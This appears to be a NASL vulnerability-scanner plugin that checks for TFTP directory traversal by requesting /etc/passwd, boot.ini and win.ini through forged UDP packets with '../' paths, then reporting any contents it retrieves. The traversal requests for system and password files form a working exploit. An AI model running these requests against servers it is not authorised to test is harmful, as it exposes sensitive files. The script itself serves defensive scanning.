if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.18262" );
	script_version( "2020-11-10T15:30:28+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 15:30:28 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-1999-0498", "CVE-1999-0183" );
	script_bugtraq_id( 6198, 11584, 11582 );
	script_name( "TFTP directory traversal" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 Michel Arboi" );
	script_family( "Remote file access" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "solution", value: "Disable the tftp daemon, or if you really need it
  run it in a chrooted environment" );
	script_tag( name: "summary", value: "The TFTP (Trivial File Transfer Protocol) allows
  remote users to read files without having to log in. This may be a big security flaw,
  especially if tftpd (the TFTP server) is not well configured by the admin of the remote host." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_active" );
	exit( 0 );
}
require("port_service_func.inc.sc");
if(TARGET_IS_IPV6()){
	exit( 0 );
}
nb = 0;
func tftp_grab( port, file ){
	var req, rep, sport, ip, u, filter, data, i;
	req = "\x00\x01" + file + "\0netascii\0";
	sport = rand() % 64512 + 1024;
	ip = forge_ip_packet( ip_hl: 5, ip_v: 4, ip_tos: 0, ip_len: 20, ip_off: 0, ip_ttl: 64, ip_p: IPPROTO_UDP, ip_src: this_host() );
	u = forge_udp_packet( ip: ip, uh_sport: sport, uh_dport: port, uh_ulen: 8 + strlen( req ), data: req );
	filter = "udp and dst port " + sport + " and src host " + get_host_ip() + " and udp[8:1]=0x00";
	data = NULL;
	for(i = 0;i < 2;i++){
		rep = send_packet( packet: u, pcap_active: TRUE, pcap_filter: filter );
		if(rep){
			data = get_udp_element( udp: rep, element: "data" );
			if( data[0] == "\0" && data[1] == "\x03" ){
				var c;
				c = substr( data, 4 );
				set_kb_item( name: "tftp/" + port + "/filename/" + nb, value: file );
				set_kb_item( name: "tftp/filename_available", value: TRUE );
				set_kb_item( name: "tftp/" + port + "/filecontent/" + nb, value: c );
				set_kb_item( name: "tftp/filcontent_available", value: TRUE );
				nb++;
				return c;
			}
			else {
				return NULL;
			}
		}
	}
	return NULL;
}
func report_and_exit( file, content, port ){
	set_kb_item( name: "tftp/" + port + "/get_file", value: file );
	report = "It was possible to retrieve the file " + file + " through tftp. Here is what we could grab : \n" + content;
	security_message( port: port, proto: "udp", data: report );
	exit( 0 );
}
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
for file in make_list( "/etc/passwd",
	 "../../../../../etc/passwd" ) {
	f = tftp_grab( port: port, file: file );
	if(f){
		if(egrep( string: f, pattern: "^.*:.*:.*:.*:" )){
			report_and_exit( file: file, content: f, port: port );
		}
	}
}
for file in make_list( "/boot.ini",
	 "../../../boot.ini",
	 "C:\\\\boot.ini",
	 "boot.ini" ) {
	f = tftp_grab( port: port, file: file );
	if(f){
		if(( ContainsString( f, "ECHO" ) ) || ( ContainsString( f, "SET " ) ) || ( ContainsString( f, "export" ) ) || ( ContainsString( f, "EXPORT" ) ) || ( ContainsString( f, "mode" ) ) || ( ContainsString( f, "MODE" ) ) || ( ContainsString( f, "doskey" ) ) || ( ContainsString( f, "DOSKEY" ) ) || ( ContainsString( f, "[boot loader]" ) ) || ( ContainsString( f, "[fonts]" ) ) || ( ContainsString( f, "[extensions]" ) ) || ( ContainsString( f, "[mci extensions]" ) ) || ( ContainsString( f, "[files]" ) ) || ( ContainsString( f, "[Mail]" ) ) || ( ContainsString( f, "[operating systems]" ) )){
			report_and_exit( file: file, content: f, port: port );
		}
	}
}
for file in make_list( "/winnt/win.ini",
	 "../../../winnt/win.ini",
	 "C:\\\\winnt\\\\win.ini",
	 "winnt\\win.ini",
	 "/windows/win.ini",
	 "../../../windows/win.ini",
	 "C:\\\\windows\\\\win.ini",
	 "windows\\win.ini" ) {
	f = tftp_grab( port: port, file: file );
	if(f){
		if(ContainsString( f, "; for 16-bit app support" )){
			report_and_exit( file: file, content: f, port: port );
		}
	}
}
exit( 99 );

